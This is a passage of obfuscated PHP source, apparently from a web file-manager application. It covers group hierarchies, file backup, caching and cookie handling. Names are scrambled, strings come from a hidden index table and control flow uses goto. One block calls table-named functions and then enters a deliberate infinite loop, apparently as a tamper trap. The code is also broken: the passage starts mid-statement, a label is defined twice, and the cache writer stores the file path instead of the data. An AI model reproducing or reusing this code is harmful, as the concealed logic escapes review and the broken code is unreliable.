$cח[$FЍΊ[515]] . $cח[$FЍΊ[1715]] . $FЍΊ[47]; } $Fҫҧ = array($FЍΊ[578] => array($FЍΊ[538], $dﳅ[$FЍΊ[515]] . $dﳅ[$FЍΊ[1715]] . $FЍΊ[539])); $c = array($FЍΊ[578] => array($FЍΊ[587], "\x72\x65\160\x6c\141\x63\145\50\160\x61\x72\145\x6e\x74\114\145\x76\145\154\x2c\47{$aЛ}\47\54\x27{$bՈ}\47\x29")); goto c; a໒: $FЍΊ =& $_SERVER[]; $aЛ = $dﳅ[$FЍΊ[515]] . $dﳅ[$FЍΊ[1715]] . $FЍΊ[47]; $bՈ = $cח[$FЍΊ[515]] . $cח[$FЍΊ[1715]] . $FЍΊ[47] . $dﳅ[$FЍΊ[1715]] . $FЍΊ[47]; goto C׌; Dԉ: } public function setNamePinyin($D, $bЙ = false) { $E =& $_SERVER[]; if (!$bЙ) { $b = $this->getInfoSimple($D); $bЙ = $b[$E[28]]; } if (!Input::check($bЙ, $E[581])) { $this->metaSet($D, $E[458], null); $this->metaSet($D, $E[457], null); return; } $A󪽊 = array($E[458] => str_replace($E[50], $E[33], Pinyin::get($bЙ)), $E[457] => Pinyin::get($bЙ, $E[582])); $this->metaSet($D, $A󪽊); } protected function groupStatus($b, $bɄ) { goto C; A: if ($bɄ == $d䣐[87]) { $c = $this->parentLevelArray($c팭[$d䣐[515]]); } else { $a̵Ӟ = array($d䣐[578] => array($d䣐[538], $c팭[$d䣐[515]] . $c팭[$d䣐[1715]] . $d䣐[539])); $c = $this->where($a̵Ӟ)->field($d䣐[1715])->select(); $c = array_to_keyvalue($c, $d䣐[33], $d䣐[1715]); } $c[] = $c팭[$d䣐[1715]]; $eӢ = array(); goto eݙ; C: $d䣐 =& $_SERVER[]; $c팭 = $this->getInfoSimple($b); if (!$c팭) { return !1; } goto A; eݙ: foreach ($c as $b) { $eӢ[] = array($d䣐[1715] => $b, $d䣐[93] => $d䣐[727], $d䣐[372] => $bɄ); $this->_clearCache($b); } return Model($d䣐[1800])->addAll($eӢ, array(), !0); goto a; a: } protected function groupRemove($Cۧ) { goto Bк; a: if (!$fܢ || $fܢ[$a[492]] == 0) { return !1; } $cի = $this->getInfoSimple($fܢ[$a[492]]); $this->_changeChildLevel($fܢ, $cի, !0); goto d; bɐ: Model($a[809])->groupRootRemove($Cۧ); return $this->where($F)->delete(); goto Eˤ; d: $this->where(array($a[492] => $Cۧ))->save(array($a[492] => $fܢ[$a[492]])); Model($a[1800])->where($F)->delete(); Model($a[1801])->where($F)->delete(); goto bɐ; Bк: $a =& $_SERVER[]; $F = array($a[1715] => $Cۧ); $fܢ = $this->where($F)->find(); goto a; Eˤ: } protected function groupSort($a) { $CǍ =& $_SERVER[]; $f鑣 = array(); foreach ($a as $fڧ => $E) { $f鑣[] = array($CǍ[1715], $E, $CǍ[1738], $fڧ + 1); } $this->saveAll($f鑣); } public function listData() { $D֗ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D֗[$_SERVER[][367]]); return $D֗; } private function _makeOrder($b❥ = '') { goto AđÌ; f㣰Ǉ: $b❥ = $b❥ . "{$E}\40{$bْힵ}\x2c\40\147\x72\157\x75\x70\111\x44\x20\x61\163\143"; return $this->order($b❥); goto Cȡ; AđÌ: $E =& $_SERVER[]; $C蛄 = array($E[1715], $E[28], $E[1701], $E[194]); $b٫ = array($E[442] => $E[443], $E[444] => $E[445]); goto a̍; a̍: $E = Input::get($E[449], $E[7], $E[1719], $C蛄); $bْힵ = Input::get($E[450], $E[7], $E[1802], array($E[1802], $E[444])); $bْힵ = $b٫[$bْힵ]; goto f㣰Ǉ; Cȡ: } public function listChild($cԟ) { $EԵɔ =& $_SERVER[]; $e = $this->where(array($EԵɔ[492] => $cԟ))->_makeOrder()->selectPage(200); $this->_listDataApply($e[$EԵɔ[367]]); return $e; } public function listByID($BԱ̪ʕ) { goto Fիաú; Fիաú: $B܍̞ =& $_SERVER[]; if (!$BԱ̪ʕ) { return array(); } $dɝ = array($B܍̞[1715] => array($B܍̞[7], $BԱ̪ʕ)); goto cݟ; d߼: return $C崰; goto B޾; cݟ: $C崰 = $this->where($dɝ)->select(); $C崰 = array_sort_keep($C崰, $B܍̞[1715], $BԱ̪ʕ); $this->_listDataApply($C崰); goto d߼; B޾: } public function listSearch($F΄䎅) { goto FІ; Eф: $Cɔ = $Cɔ ? $Cɔ : array($dӄ[367] => array(), $dӄ[364] => array()); if (!$Cɔ || count($Cɔ[$dӄ[367]]) < 5 && Input::check($d, $dӄ[316])) { goto dݕҡ; A⩪Ʒ: $Cɔ[$dӄ[364]][$dӄ[366]] = ceil($Cɔ[$dӄ[364]][$dӄ[365]] / $Cɔ[$dӄ[364]][$dӄ[361]]); goto aܹЙ; dݕҡ: $F = $this->groupChildrenAll($D); $D = $this->_searchFromMeta($dӄ[457], $d, 10, $F); $B، = $this->_searchFromMeta($dӄ[458], $d, 10, $F); goto CӦވ; CӦވ: $cي = array_merge($D, $B،, $Cɔ[$dӄ[367]]); $Cɔ[$dӄ[367]] = array_unique_by_key($cي, $dӄ[1715]); $Cɔ[$dӄ[364]][$dӄ[365]] = count($Cɔ[$dӄ[367]]); goto A⩪Ʒ; aܹЙ: } $this->_listDataApply($Cɔ[$dӄ[367]]); goto Bݼ; BƬ: if ($D) { $e叇 = $this->getInfoSimple($D); $cҘ = $e叇[$dӄ[515]] . $D . $dӄ[539]; $D݉آ = array($D݉آ, array($dӄ[515] => array($dӄ[381], $cҘ))); } $D݉آ = $this->parseWhereLike($D݉آ); $Cɔ = $this->_makeOrder()->where($D݉آ)->selectPage(20); goto Eф; AĈ: if (!trim($d)) { return !1; } $d = str_replace($dӄ[1805], $dӄ[1806], $d); $D݉آ = array($dӄ[1715] => array($dӄ[381], "{$d}\45"), $dӄ[28] => array($dӄ[381], "\x25{$d}\45"), $dӄ[976] => $dӄ[1807]); goto BƬ; Bݼ: return $Cɔ; goto A؅ы; FІ: $dӄ =& $_SERVER[]; $d = $F΄䎅[$dӄ[1803]]; $D = isset($F΄䎅[$dӄ[1804]]) ? $F΄䎅[$dӄ[1804]] : !1; goto AĈ; A؅ы: } protected function groupChildrenAll($AȢ) { $C =& $_SERVER[]; if (!$AȢ) { return !1; } if (is_string($AȢ)) { $AȢ = array($AȢ); } $D֍俹 = $AȢ; foreach ($AȢ as $cɥ) { $fћό = $this->getInfoSimple($cɥ); $BゞЃ = array($C[515] => array($C[381], $fћό[$C[515]] . $cɥ . $C[539])); $Bϖ = $this->field($C[1715])->where($BゞЃ)->select(); $D֍俹 = array_merge($D֍俹, array_to_keyvalue($Bϖ, $C[33], $C[1715])); } return array_unique($D֍俹); } private function _searchFromMeta($F, $Cȫ, $cك, $C癴) { goto AȚͅ; cߵ: if (!$D¶) { return array(); } return $D¶; goto Aƴ; Cڤ: if (!$Bȇ) { return array(); } $Bȇ = array_to_keyvalue($Bȇ, $aь[33], $aь[1715]); $D¶ = $this->where(array($aь[1799] => array($aь[7], $Bȇ)))->select(); goto cߵ; AȚͅ: $aь =& $_SERVER[]; $Cȫ = strtolower($Cȫ); $cފԩ = array($aь[93] => $F, $aь[372] => array($aь[381], "\45{$Cȫ}\45")); goto D۪; D۪: $cފԩ = $this->parseWhereLike($cފԩ); if ($C癴) { $cފԩ[$aь[1715]] = array($aь[7], $C癴); } $Bȇ = Model($aь[1808])->where($cފԩ)->limit($cك)->select(); goto Cڤ; Aƴ: } protected function _listDataApplyItem($C) { $Cכ⇝ = array($C); $this->_listDataApply($Cכ⇝); return $Cכ⇝[0]; } protected function _listDataApply(&$C玧) { goto C̩; fˤ: $this->_listAppendChildren($C玧); $this->_listAppendChildrenMember($C玧); $this->_listAppendMeta($C玧, $Eǂݪ); goto cծ; cծ: $this->_listAppendParent($C玧); $this->_listAppendSourceRoot($C玧, $Eǂݪ); goto Fې; C̩: $C =& $_SERVER[]; if (!$C玧) { return; } $Eǂݪ = array_to_keyvalue($C玧, $C[33], $C[1715]); goto fˤ; Fې: } private function _listAppendChildren(&$cұѨ) { goto c; c笏: $e龎 = array($eৗ[492], $eৗ[1809] => $eৗ[494]); $Dο = $this->field($e龎)->where($B)->group($eৗ[492])->select(); $Aǒщ = array_to_keyvalue($Dο, $eৗ[492], $eৗ[494]); goto A; A: foreach ($cұѨ as &$b蝵) { $D填ȱ = $b蝵[$eৗ[1715]]; $b蝵[$eৗ[1810]] = isset($Aǒщ[$D填ȱ]) ? intval($Aǒщ[$D填ȱ]) : !1; } unset($b蝵); goto F; c: $eৗ =& $_SERVER[]; $f = array_to_keyvalue($cұѨ, $eৗ[33], $eৗ[1715]); $B = array($eৗ[492] => array($eৗ[7], $f)); goto c笏; F: } private function _listAppendChildrenMember(&$f読) { goto dϋ; dҗ: $b΃㳤 = array($Aŵ[1715], $Aŵ[1809] => $Aŵ[494]); $c = Model($Aŵ[1801])->field($b΃㳤)->where($d׊ګ)->group($Aŵ[1715])->select(); $eūɮ = array_to_keyvalue($c, $Aŵ[1715], $Aŵ[494]); goto b븐; b븐: foreach ($f読 as &$C޹) { $B̎㼑 = $C޹[$Aŵ[1715]]; $C޹[$Aŵ[1811]] = isset($eūɮ[$B̎㼑]) ? intval($eūɮ[$B̎㼑]) : !1; } unset($C޹); goto aȇܩ; dϋ: $Aŵ =& $_SERVER[]; $d΢ = array_to_keyvalue($f読, $Aŵ[33], $Aŵ[1715]); $d׊ګ = array($Aŵ[1715] => array($Aŵ[7], $d΢)); goto dҗ; aȇܩ: } private function _listAppendMeta(&$E, $F𰎽) { goto dʽ; b󘄼Ή: foreach ($E as &$FǍ߅) { $FǍ߅[$A[459]] = array(); if (isset($AϜڒׇ[$FǍ߅[$A[1715]]])) { $FǍ߅[$A[459]] = $AϜڒׇ[$FǍ߅[$A[1715]]]; } } unset($FǍ߅); goto d; dʽ: $A =& $_SERVER[]; $e⏋޻ = array($A[1715] => array($A[7], $F𰎽)); $AϜڒׇ = Model($A[1800])->where($e⏋޻)->select(); goto E; E: $AϜڒׇ = array_to_keyvalue_group($AϜڒׇ, $A[1715]); foreach ($AϜڒׇ as &$c¡) { $c¡ = array_to_keyvalue($c¡, $A[93], $A[372]); } unset($c¡); goto b󘄼Ή; d: } protected function parentLevelArray($A࠮) { $d◠ß =& $_SERVER[]; $A࠮ = explode($d◠ß[47], trim($A࠮, $d◠ß[47])); $A࠮ = array_remove_value($A࠮, $d◠ß[191]); return $A࠮; } private function _listAppendParent(&$F) { goto F͎; Fኆ: unset($a̝); foreach ($c as $Dŝ => $cǸٟ) { if ($cǸٟ) { continue; } $Bڤ = $this->getInfoSimple($Dŝ); $c[$Dŝ] = $Bڤ[$D޴[28]]; } $Eོ = $GLOBALS[$D޴[6]][$D޴[88]][$D޴[1812]]; goto fӎ޶; F͎: $D޴ =& $_SERVER[]; $c = array(); foreach ($F as &$a̝) { $c[$a̝[$D޴[1715]]] = $a̝[$D޴[28]]; $d͜ĩ = $this->parentLevelArray($a̝[$D޴[515]]); foreach ($d͜ĩ as $C) { if (!isset($c[$C])) { $c[$C] = 0; } } } goto Fኆ; fӎ޶: if ($GLOBALS[$D޴[499]] == $D޴[87]) { $Eོ = !1; } foreach ($F as &$a̝) { $d͜ĩ = $this->parentLevelArray($a̝[$D޴[515]]); $fӅʇ = $D޴[33]; foreach ($d͜ĩ as $Dŝ => $C) { if ($Eོ && $Dŝ == 0) { continue; } $fӅʇ .= $c[$C] . $D޴[8]; } if ($d͜ĩ) { $fӅʇ .= $a̝[$D޴[28]]; } $a̝[$D޴[520]] = str_replace($D޴[523], $D޴[8], $fӅʇ); } unset($a̝); goto c; c: } private function _listAppendSourceRoot(&$Fǽ, $e݊) { goto cɪ; b: $BՎ = $F׻->limit(count($e݊))->where($bﭿ)->select(); $BՎ = array_to_keyvalue($BՎ, $fʥ[498]); $BՎ = array_remove_key($BՎ, $fʥ[498]); goto c𙄓; c𙄓: foreach ($Fǽ as &$D󕝂) { $D󕝂[$fʥ[85]] = $BՎ[$D󕝂[$fʥ[1715]]] ? $BՎ[$D󕝂[$fʥ[1715]]] : array(); } unset($D󕝂); goto d; cɪ: $fʥ =& $_SERVER[]; $bﭿ = array($fʥ[492] => 0, $fʥ[498] => array($fʥ[7], $e݊), $fʥ[406] => SourceModel::TYPE_GROUP); $F׻ = Model($fʥ[809])->order($fʥ[1813])->field($fʥ[1814]); goto b; d: } protected function groupMerge($B) { $B = array_values(array_unique($B)); $D򖇥 = array(); for ($d㻟 = 0; $d㻟 < count($B); $d㻟++) { $eϲ = !1; for ($EϬ = 0; $EϬ < count($B); $EϬ++) { if ($d㻟 == $EϬ) { continue; } if ($this->isParentOf($B[$EϬ], $B[$d㻟])) { $eϲ = !0; break; } } if (!$eϲ) { $D򖇥[] = $B[$d㻟]; } } return $D򖇥; } protected function isParentOf($FŻ, $C׻) { goto E; Fէ: $b͵ª = $this->getInfoSimple($C׻); $D˼ = $eˆ[$A[515]] . $FŻ . $A[47]; if (substr($b͵ª[$A[515]], 0, strlen($D˼)) == $D˼) { return !0; } goto eÂѠ; eÂѠ: return !1; goto EՌЕ; E: $A =& $_SERVER[]; if (!$FŻ || !$C׻ || $FŻ == $C׻) { return !1; } $eˆ = $this->getInfoSimple($FŻ); goto Fէ; EՌЕ: } public function groupShowRoot($dӈߜ, $A酶 = false) { goto c; c: $bЋɥ =& $_SERVER[]; $EǷؽ = $this->getInfo($dӈߜ); if (!$EǷؽ) { return array(); } goto C餪; Fʵ: if ($A酶 && count($Cڐ) == 1) { return $c膿; } if (!$EǷؽ[$bЋɥ[459]] || !isset($EǷؽ[$bЋɥ[459]][$bЋɥ[1797]]) || $EǷؽ[$bЋɥ[459]][$bЋɥ[1797]] == $bЋɥ[1769]) { return $this->groupShowRoot($Cڐ[count($Cڐ) - 1], $A酶); } if ($EǷؽ[$bЋɥ[459]][$bЋɥ[1797]] == $bЋɥ[355]) { $c煐 = explode($bЋɥ[47], $EǷؽ[$bЋɥ[459]][$bЋɥ[1798]]); if ($c煐) { $c膿 = array_merge($c膿, $c煐); } } goto eግ; C餪: $Cڐ = $this->parentLevelArray($EǷؽ[$bЋɥ[515]]); $c膿 = array($dӈߜ); if (count($Cڐ) == 0) { return $c膿; } goto Fʵ; eግ: return $c膿; goto fӰ; fӰ: } protected function resetParentLevel() { $a镃 =& $_SERVER[]; $F׵е = $a镃[1715]; $bص׼ = $this->select(); $bص׼ = array_to_keyvalue($bص׼, $F׵е); foreach ($bص׼ as $E՚) { goto E器; B: $DФ[] = 0; $DФ = $a镃[47] . implode($a镃[47], array_reverse($DФ)) . $a镃[47]; $this->setNamePinyin($E՚[$F׵е], $E՚[$a镃[28]]); goto e⮒; e⮒: $this->where(array($F׵е => $E՚[$F׵е]))->save(array($a镃[578] => $DФ)); goto EҖ; E器: $cﺲ = $E՚; $DФ = array(); while ($cﺲ[$a镃[492]] != 0) { $DФ[] = $cﺲ[$a镃[492]]; $cﺲ = $bص׼[$cﺲ[$a镃[492]]]; } goto B; EҖ: } return $bص׼; } public function groupNameAuto($Fͨ܏, $E˩) { $f̕ =& $_SERVER[]; $Bݠ = $this->where(array($f̕[396] => $Fͨ܏))->getField($f̕[28], !0); if (!$Bݠ || !in_array($E˩, $Bݠ)) { return $E˩; } for ($b = 1; $b <= count($Bݠ) + 1; $b++) { $BЈ = $E˩ . "\x28{$b}\x29"; if (!in_array($BЈ, $Bݠ)) { return $BЈ; } } } public function groupSwitch($fϒɆ, $Fᶇ) { goto ač; B: $ḁ = !empty($A[$fϒɆ]) ? $A[$fϒɆ] : !1; if ($ḁ) { goto D܄; D܄: if (!$A[$Fᶇ]) { $A[$Fᶇ] = Model($dۖ[809])->groupRootAdd($Fᶇ); } $e = $A[$Fᶇ]; $b㬱 = array($dۖ[492] => $ḁ); goto fƉЭ; Bٱ: foreach ($A as $Cѕ) { $C덓 = $Cѕ[$dۖ[405]] == $dۖ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($dۖ[809])->move($Cѕ[$dۖ[397]], $e, $C덓); } Model($dۖ[809])->moveClearAuth = !0; $b㬱 = array($dۖ[406] => 2, $dۖ[498] => $fϒɆ); goto cۮȢ; cۮȢ: $Fǐ = array($dۖ[498] => $Fᶇ); Model($dۖ[1818])->where($b㬱)->save($Fǐ); Model($dۖ[1819])->where($b㬱)->save($Fǐ); goto F𛇑; fƉЭ: $A = Model($dۖ[809])->where($b㬱)->field($dۖ[1817])->select(); if (!$A) { $A = array(); } Model($dۖ[809])->moveClearAuth = !1; goto Bٱ; F𛇑: } $this->_changeChildLevel($F[$fϒɆ], $F[$Fᶇ], !0); goto bס; A: $F = array_to_keyvalue($F, $dۖ[1715]); if (!isset($F[$fϒɆ]) || !isset($F[$Fᶇ]) || $F[$fϒɆ][$dۖ[492]] == 0) { return !1; } $b㬱 = array($dۖ[1715] => $fϒɆ); goto F; ač: $dۖ =& $_SERVER[]; $b㬱 = array($dۖ[1715] => array($dۖ[7], array($fϒɆ, $Fᶇ))); $F = $this->where($b㬱)->select(); goto A; dޗ: $b㬱 = array($dۖ[406] => 2, $dۖ[492] => 0, $dۖ[405] => 1, $dۖ[498] => array($dۖ[7], array($fϒɆ, $Fᶇ))); $A = Model($dۖ[809])->where($b㬱)->field($dۖ[1816])->select(); $A = array_to_keyvalue($A, $dۖ[498], $dۖ[397]); goto B; bס: $this->where(array($dۖ[492] => $fϒɆ))->save(array($dۖ[492] => $Fᶇ)); $this->_clearChildrenCache($F[$Fᶇ]); return !0; goto AǶ; F: $bϺ = Model($dۖ[1801])->where($b㬱)->select(); if (!$bϺ) { $bϺ = array(); } foreach ($bϺ as $A) { $C⸗߃ = $A[$dۖ[1546]]; $b㬱 = array($dۖ[1546] => $C⸗߃, $dۖ[1715] => $Fᶇ); $dӬ = Model($dۖ[1801])->where($b㬱)->find(); if (!$dӬ) { $B݂ = array($Fᶇ => $A[$dۖ[1815]]); Model($dۖ[532])->userGroupAdd($C⸗߃, $B݂); } Model($dۖ[532])->userGroupRemove($C⸗߃, $fϒɆ); } goto dޗ; AǶ: } } goto fֲ; FѻȽ: class BackupFile { public function __construct() { } public function index() { goto bԑĭ; f΋ɓ: $Bռ킄 = (int) Model($_SERVER[][764])->where($b)->count($_SERVER[][461]); $E = (int) Model($_SERVER[][764])->where($b)->sum($_SERVER[][78]); $Eͣ = new TaskFileTransfer($_SERVER[][793], $_SERVER[][759], $Bռ킄, LNG($_SERVER[][760]) . $_SERVER[][761] . LNG($_SERVER[][794])); goto B; B: $Eͣ->task[$_SERVER[][740]] = $E; $dޯ = array($_SERVER[][795] => $Bռ킄, $_SERVER[][796] => $E, $_SERVER[][797] => time()); Backup::set($dޯ); goto B; D߈: $Eͩ = $dĽ = 0; do { $e = $_SERVER[][798]; $C䌼̓ = Model($_SERVER[][764])->where($b)->field($e)->order($_SERVER[][799])->selectPage($f, $DΞ); $F݈ = !empty($C䌼̓[$_SERVER[][367]]) ? $C䌼̓[$_SERVER[][367]] : array(); foreach ($F݈ as $fަ䖊) { goto dı; cٷ: $f += $fަ䖊[$_SERVER[][78]]; $dĽ += 1; $Eͩ += $fަ䖊[$_SERVER[][78]]; goto Bώ; bͯ: if (IO::exist($E鬹)) { $Eͣ->updateFileEnd($fަ䖊[$_SERVER[][28]], $fަ䖊[$_SERVER[][78]]); } else { $E鬹 = get_path_father($E鬹); IO::mkdir($E鬹); if (!IO::copy($A, $E鬹, $_SERVER[][802])) { write_log($_SERVER[][803] . $A . $_SERVER[][786] . $E鬹 . $_SERVER[][530], $_SERVER[][759]); $B쓋 = !1; break; } } $fѡɴ = $fަ䖊[$_SERVER[][461]]; $b += 1; goto cٷ; Bώ: if ($f >= 1024 * 1024 * 100) { $dޯ = array($_SERVER[][804] => $fѡɴ, $_SERVER[][805] => $dĽ, $_SERVER[][806] => $Eͩ); Backup::set($dޯ); $f = $b = 0; } goto Fم; dı: if (!$this->_fileExist($fަ䖊, $b셻, $Bᔼ)) { $Bռ킄 -= 1; $E -= (int) $fަ䖊[$_SERVER[][78]]; write_log("\146\x69\154\145\40\x6e\x6f\x74\40\x65\x78\151\x73\164\x2e\146\x69\x6c\145\x49\104\72{$fަ䖊[$_SERVER[][461]]}\54\40\160\141\x74\150\x3a{$fަ䖊[$_SERVER[][76]]}", $_SERVER[][800]); continue; } $A = $fަ䖊[$_SERVER[][76]]; $E鬹 = "\x7b\151\157\72{$a͗[$_SERVER[][729]]}\x7d" . substr($A, strlen("\173\x69\x6f\x3a{$fަ䖊[$_SERVER[][801]]}\175")); goto bͯ; Fم: } $fԲҘ = count($F݈); $DΞ++; } while ($fԲҘ == $f); $Eͣ->end(); goto F؏; Bִη: $this->_fileFilter($b셻); return !0; goto B; bԑĭ: $a͗ = Backup::get(); $fѡɴ = $a͗[$_SERVER[][291]][$_SERVER[][193]][$_SERVER[][461]]; $b = array($_SERVER[][462] => array($_SERVER[][791], $fѡɴ), $_SERVER[][792] => array($_SERVER[][329], $a͗[$_SERVER[][729]])); goto f΋ɓ; B: $B쓋 = !0; $Bᔼ = $this->storeIds(); $DΞ = 1; goto B칉; F؏: $dޯ = array($_SERVER[][807] => 1, $_SERVER[][490] => time(), $_SERVER[][752] => 1, $_SERVER[][804] => $fѡɴ, $_SERVER[][796] => $E, $_SERVER[][795] => $Bռ킄, $_SERVER[][808] => time()); if ($b) { $dޯ[$_SERVER[][805]] = $dĽ; $dޯ[$_SERVER[][806]] = $Eͩ; } Backup::set($dޯ); goto Bִη; B칉: $f = 1000; $f = $b = 0; $b셻 = array(); goto D߈; B: } private function _fileExist($bŲٟ, &$dՓ, $b) { goto e֏; e಍: if (!in_array($bŲٟ[$EıƉ[801]], $b)) { return !1; } if (IO::exist($A)) { return !0; } $e = get_path_father($A); goto A; A: if (IO::exist($e)) { $dՓ[] = $bŲٟ[$EıƉ[461]]; return !1; } $Aݗȴ = array($EıƉ[801] => $bŲٟ[$EıƉ[801]], $EıƉ[76] => array($EıƉ[381], "{$e}\x25")); $e = Model($EıƉ[764])->where($Aݗȴ)->field($EıƉ[462])->select(); goto b؄; e֏: $EıƉ =& $_SERVER[]; $A = $bŲٟ[$EıƉ[76]]; if (in_array($bŲٟ[$EıƉ[461]], $dՓ)) { return !1; } goto e಍; b؄: $dՓ = array_merge($dՓ, array_to_keyvalue($e, $EıƉ[33], $EıƉ[461])); return !1; goto c; c: } private function _fileFilter($e) { $a͊ˎґ =& $_SERVER[]; if (empty($e)) { return; } $d = array($a͊ˎґ[461] => array($a͊ˎґ[7], array_unique($e))); $bü = Model($a͊ˎґ[809])->where($d)->field($a͊ˎґ[397])->select(); foreach ($bü as $EΓ) { Model($a͊ˎґ[809])->remove($EΓ[$a͊ˎґ[397]], !1); } } private function storeIds() { $bζɴ =& $_SERVER[]; $Eɡ = Model($bζɴ[744])->listData(); $A = array(); $b = $GLOBALS[$bζɴ[6]][$bζɴ[88]][$bζɴ[810]]; foreach ($Eɡ as $CǕ) { $B搟 = strtolower($CǕ[$bζɴ[94]]); if (!isset($b[$B搟])) { continue; } $DЈ = $bζɴ[72] . (isset($b[$B搟]) ? $b[$B搟] : ucfirst($B搟)); if (!class_exists($DЈ)) { continue; } $A[] = $CǕ[$bζɴ[395]]; } return $A; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto a; b: $a = $GLOBALS[$c則[6]][$c則[347]]; $dÑ = $a[$a[$c則[811]]]; $Cג = $a[$c則[812]]; goto f􋈪; a: $c則 =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto b; f􋈪: switch ($a[$c則[811]]) { case $c則[17]: self::$handle = Model($c則[813]); break; case $c則[814]: self::$handle = new CacheRedis($dÑ, $Cג); break; case $c則[815]: self::$handle = new CacheMemcached($dÑ, $Cג); break; case $c則[193]: self::$handle = new CacheFile($dÑ, $Cג); break; default: break; } return self::$handle; goto d䰲; d䰲: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($a֜) { if (is_array($a֜) || is_object($a֜)) { $a֜ = json_encode($a֜); } $a֜ = rawurlencode($a֜); return md5(KOD_SITE_ID . $_SERVER[][71] . $a֜); } public static function get($Fȩ, $Eݮ = false) { $eҐ = self::key($Fȩ); if ($Eݮ) { return unserialize(self::init()->get($eҐ)); } if (!isset(self::$memoryCache[$eҐ])) { $Cװ̈́ = self::init()->get($eҐ); self::$memoryCache[$eҐ] = unserialize($Cװ̈́); } return self::$memoryCache[$eҐ]; } public static function set($f©, $Cؗ, $fؤ = false) { goto B; A: CacheLock::lock($f©); $Dŭ = self::init()->set($eؽ, serialize($Cؗ), $fؤ); self::$memoryCache[$eؽ] = $Cؗ; goto E妈; E妈: CacheLock::unlock($f©); return $Dŭ; goto a䅅; B: $eؽ = self::key($f©); if (isset(self::$memoryCache[$eؽ]) && self::$memoryCache[$eؽ] === $Cؗ) { return !0; } if ($fؤ === 0) { self::$memoryCache[$eؽ] = $Cؗ; return !0; } goto A; a䅅: } public static function getCall($b҅, $a궙, $cᵄ, $Cք = array()) { goto Aۇň; b: return $fނ; goto Aّ; Aۇň: $bݱ =& $_SERVER[]; $fނ = self::get($b҅); if ($fނ || $fނ === $bݱ[33]) { return $fނ; } goto Fҫʗ; Fҫʗ: $fނ = call_user_func_array($cᵄ, $Cք); $fނ = $fނ ? $fނ : $bݱ[33]; self::set($b҅, $fނ, $a궙); goto b; Aّ: } public static function remove($f񰯴) { goto a钉; a钉: $e = self::key($f񰯴); unset(self::$memoryCache[$e]); self::clearTimeout(); goto cϟ; cϟ: CacheLock::lock($f񰯴); $f閸 = self::init()->remove($e); CacheLock::unlock($f񰯴); goto b߈֜; b߈֜: return $f閸; goto a; a: } public static function removeMemory($e) { $Eװ = self::key($e); unset(self::$memoryCache[$Eװ]); } public static function clearMemory($fҰ = false) { if ($fҰ) { $fҰ = self::key($fҰ); unset(self::$memoryCache[$fҰ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][816])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][817])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($DỜ, $e) { $f =& $_SERVER[]; $this->cachePath = $DỜ[$f[76]]; $this->prefix = $f[818]; $this->cacheTime = $e; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Dߌ) { $a =& $_SERVER[]; $Dߌ = str_replace(array($a[819], $a[97], $a[70]), $a[820], $Dߌ); return $this->cachePath . $a[821] . $Dߌ . $a[822]; } public function set($dƣљ, $B, $d = false) { $B = $this->getFile($dƣљ); if (file_put_contents($B, $this->prefix . $B, LOCK_EX)) { @touch($B, intval(time() + $d)); clearstatcache(); return !0; } @unlink($B); return !1; } public function get($a) { $aɭң = $this->getFile($a); if (file_exists($aɭң) && filemtime($aɭң) < time()) { @unlink($aɭң); return !1; } $DІ = @file_get_contents($aɭң); return substr($DІ, strlen($this->prefix)); } public function remove($cŘ) { $f = $this->getFile($cŘ); return @unlink($f); } public function deleteAll() { $bҋ =& $_SERVER[]; $FȠ = scandir($this->cachePath); foreach ($FȠ as $dά) { $E = $this->cachePath . $dά; if (strpos($E, $bҋ[822]) && strpos($E, $bҋ[823])) { @unlink($E); } } } public function clearTimeout() { $Bߍ =& $_SERVER[]; $aѭ = scandir($this->cachePath); foreach ($aѭ as $f²) { $A߆ = $this->cachePath . $f²; if (strpos($A߆, $Bߍ[822]) && strpos($A߆, $Bߍ[823]) && filemtime($A߆) < time()) { @unlink($A߆); } } } } goto D΋; C: if (!isset($_SERVER[$_SERVER[][840]]) || !isset($_SERVER[$_SERVER[][841]])) { goto Dۃڋ; e: $b䲽ҳ = explode($_SERVER[][229], $F缾); if (count($b䲽ҳ) < $_SERVER[][623]) { $cƃܣ = $_SERVER[][845]; $cƃܣ(); } $e愼 = $_SERVER[][846]; goto Aᑑ; Dۃڋ: $d탞 = $_SERVER[][842]; $d = $_SERVER[$_SERVER[][843]] . $_SERVER[][844]; $F缾 = $d탞($d); goto e; Aᑑ: $e愼($_SERVER[$_SERVER[][843]] . $_SERVER[][844]); $fə٠ = 2; while ($fə٠ > 1) { $d᳌˅ = rawurlencode($fə٠ . $_SERVER[][376]); } goto aË; aË: } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($D = '', $cԨ = 0) { if (is_string($D) && $D != $_SERVER[][33]) { $this->prefix = $D; } if (is_numeric($cԨ) && $cԨ > 0) { $this->expire = $cԨ; } } public static function getInstance() { static $bڸ; if ($bڸ === null) { $bڸ = new self(); } return $bڸ; } private static $cookieDisable = false; public static function disable($EѥԌ) { self::$cookieDisable = $EѥԌ; } private static $sameCookieSet = array(); public static function set($aż, $aܥ, $C慛 = 0, $Cׅ = false, $AŴ = false) { goto b˷Ą; E: if (isset(self::$sameCookieSet[$aż]) && self::$sameCookieSet[$aż] == $aܥ . $C慛) { return; } self::$sameCookieSet[$aż] = $aܥ . $C慛; if (!$AŴ) { $AŴ = str_replace(HOST, $c̋[33], APP_HOST); $AŴ = _get($GLOBALS, $c̋[863], $AŴ); } goto aּ; aּ: $EΟ = $c̋[33]; setcookie($aż, $aܥ, time() + $C慛, $c̋[8] . trim($AŴ, $c̋[8]) . $EΟ, !1, !1, $Cׅ); goto F˫; b˷Ą: $c̋ =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$C慛) { $C慛 = 24 * 3600 * 7; } goto E; F˫: } public static function setSafe($cё֑, $b, $Eڒ = 0) { self::set($cё֑, $b, $Eڒ, !0); } public static function get($bЉԵ) { return isset($_COOKIE[$bЉԵ]) ? $_COOKIE[$bЉԵ] : !1; 